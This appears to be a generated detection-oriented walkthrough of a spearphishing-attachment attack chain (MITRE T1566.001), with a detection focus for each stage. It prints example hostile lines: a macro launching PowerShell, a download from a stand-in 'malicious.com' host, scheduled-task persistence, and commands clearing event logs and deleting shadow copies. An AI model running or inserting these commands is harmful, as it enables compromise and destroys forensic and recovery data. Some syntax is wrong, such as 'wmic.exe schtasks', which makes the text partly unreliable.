<output>
Pattern Name: T1566.001 (Spearphishing Attachment)
Scenario Overview: This attack scenario illustrates a multi-stage spearphishing attack where an attacker sends a malicious email with an attachment that, when opened, executes a payload. The attack leverages various applications, including Outlook for email delivery, Excel for the malicious attachment, and PowerShell for executing commands on the victim's machine.

Attack Flow Breakdown:

**Stage 1: Initial Access via Spearphishing Email**
- **Applications Involved**: Outlook
- **User Action**: The user receives an email with a subject line "Invoice Attached" and an Excel file named "Invoice_2023.xlsx".
- **Key Artifacts**: Email headers, attachment file (Invoice_2023.xlsx).
- **Detection Focus**: Monitor for emails with suspicious attachments and analyze email headers for indicators of compromise (IoCs).

**Stage 2: Opening the Malicious Attachment**
- **Applications Involved**: Excel
- **User Action**: The user opens the attachment in Excel, which contains a macro designed to execute a PowerShell command.
- **Key Artifacts**: Excel file with macros enabled, macro code (e.g., `Auto_Open`).
- **Detection Focus**: Monitor for the execution of macros in Excel files, especially those that invoke PowerShell commands.

```shell
# Example of a macro that executes PowerShell
Sub Auto_Open()
    Dim objShell As Object
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run "powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\malicious_script.ps1"
End Sub
```

**Stage 3: Execution of PowerShell Script**
- **Applications Involved**: PowerShell
- **User Action**: The macro executes a PowerShell script that downloads additional malware from a remote server.
- **Key Artifacts**: PowerShell command execution logs, downloaded files (malicious_script.ps1).
- **Detection Focus**: Monitor for PowerShell execution with `-ExecutionPolicy Bypass` and network connections to known malicious IPs or domains.

```shell
# Example PowerShell command to download a payload
powershell.exe -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri http://malicious.com/payload.exe -OutFile C:\Users\Public\payload.exe"
```

**Stage 4: Payload Execution**
- **Applications Involved**: Explorer, payload executable
- **User Action**: The downloaded payload is executed, establishing a reverse shell to the attacker's command and control (C2) server.
- **Key Artifacts**: Executable file (payload.exe), network connections to C2 server.
- **Detection Focus**: Monitor for unusual outbound connections, especially those initiated by newly created executables.

```shell
# Example of a command to execute the downloaded payload
C:\Users\Public\payload.exe
```

**Stage 5: Establishing Persistence**
- **Applications Involved**: WMI, Task Scheduler
- **User Action**: The payload creates a scheduled task using WMI to ensure persistence on the system.
- **Key Artifacts**: Scheduled task entries, WMI queries.
- **Detection Focus**: Monitor for the creation of scheduled tasks via WMI and unusual WMI queries.

```shell
# Example of a WMI command to create a scheduled task
wmic.exe schtasks create /tn "MaliciousTask" /tr "C:\Users\Public\payload.exe" /sc onlogon /ru "SYSTEM"
```

**Stage 6: Cleanup and Covering Tracks**
- **Applications Involved**: PowerShell, WMI
- **User Action**: The attacker uses PowerShell to delete logs and shadow copies to cover their tracks.
- **Key Artifacts**: PowerShell commands for log deletion, WMI commands for shadow copy deletion.
- **Detection Focus**: Monitor for PowerShell commands that delete event logs or shadow copies.

```shell
# Example PowerShell command to delete event logs
powershell.exe -Command "wevtutil cl Security"
# Example WMI command to delete shadow copies
wmic.exe shadowcopy delete
```

</output>